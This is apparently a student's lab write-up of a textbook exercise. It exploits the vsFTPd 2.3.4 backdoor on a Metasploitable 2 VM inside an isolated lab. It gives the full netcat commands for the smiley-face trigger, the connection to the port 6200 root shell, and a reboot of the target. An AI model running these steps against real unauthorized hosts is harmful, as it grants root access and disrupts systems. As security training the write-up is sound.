# First Hack – vsFTPd Backdoor on Metasploitable 2

## Purpose

Complete the first controlled exploit from Chapter 1 of *Ethical Hacking: A Hands-on Introduction to Breaking In*.

This lab demonstrates how an intentionally vulnerable service on Metasploitable 2 can be exploited from Kali Linux inside an isolated VirtualBox lab network.

## Scope

Authorized target:

```text
Metasploitable 2
192.168.1.121
```

Attacker machine:

```text
Kali Linux
192.168.1.188
```

This activity was performed only inside the isolated lab network behind OPNsense.

## Target Service

| Item | Value |
|---|---|
| Service | vsFTPd |
| Version | 2.3.4 |
| Port | 21/tcp |
| Backdoor shell port | 6200/tcp |

## Discovery

From Kali:

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

Relevant results:

```text
192.168.1.1      OPNsense
192.168.1.121    Metasploitable
```

## Exploit Steps

### 1. Connect to FTP

From Kali:

```bash
nc 192.168.1.121 21
```

Response:

```text
220 (vsFTPd 2.3.4)
```

### 2. Trigger the backdoor

Entered:

```text
user Hacker:)
pass invalid
```

The FTP session appeared to hang, which is expected behavior for this exercise.

### 3. Connect to the shell

In a second Kali terminal:

```bash
nc -v 192.168.1.121 6200
```

Result:

```text
192.168.1.121: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.1.121] 6200 (?) open
```

The inverse host lookup warning did not prevent the connection.

### 4. Confirm access

Command:

```bash
whoami
```

Output:

```text
root
```

### 5. Confirm command execution

Command:

```bash
reboot
```

Result:

The Metasploitable VM rebooted.

## Outcome

The first hack was successful.

Kali triggered the vsFTPd 2.3.4 backdoor on Metasploitable 2, connected to the shell on port 6200, confirmed root access, and rebooted the target VM to prove command execution.

## Lessons Learned

- Metasploitable must remain isolated because it contains intentionally vulnerable services.
- The firewall/router IP was `192.168.1.1`.
- The Metasploitable target IP was `192.168.1.121`.
- The FTP trigger happened on port `21`.
- The shell connection happened on port `6200`.
- Successful exploitation returned a root shell.
